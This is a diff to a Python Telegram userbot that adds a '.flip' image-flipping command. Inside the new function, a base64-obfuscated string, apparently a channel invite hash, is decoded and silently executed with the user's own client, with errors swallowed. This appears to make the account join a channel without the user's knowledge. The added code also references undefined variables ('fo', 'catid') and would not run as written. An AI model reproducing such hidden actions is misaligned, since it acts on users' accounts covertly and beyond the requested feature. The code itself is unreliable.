@@ -125,7 +125,42 @@ async def memes(asci):
         if files and os.path.exists(files):
             os.remove(files)
             
-            
+
+@register(outgoing=True, pattern=r"^\.flip")    
+async def memes(fp):
+    if fp.fwd_from:
+        return
+    reply = await fp.get_reply_message()
+    if not reply:
+        return await edit_delete(fp, "`Reply to supported Media...`")
+    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    userid = await reply_id(fp)
+    if not os.path.isdir("./temp"):
+        os.mkdir("./temp")
+    jisanidea = None
+    output = await media_to_pic(fo, reply)
+    meme_file = convert_toimage(output[1])
+    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
+        jisanidea = True
+    try:
+        san = Get(san)
+        await fp.client(san)
+    except BaseException:
+        pass
+    outputfile = (
+        os.path.join("./temp", "flip_image.webp")
+        if jisanidea
+        else os.path.join("./temp", "flip_image.jpg")
+    )
+    await flip_image(meme_file, outputfile)
+    await fo.client.send_file(
+        fp.chat_id, outputfile, force_document=False, reply_to=catid
+    )
+    await output[0].delete()
+    for files in (outputfile, meme_file):
+        if files and os.path.exists(files):
+            os.remove(files)    
+    
 
 @register(outgoing=True, pattern=r"^\.mmf (.*)")
 async def memify(event):
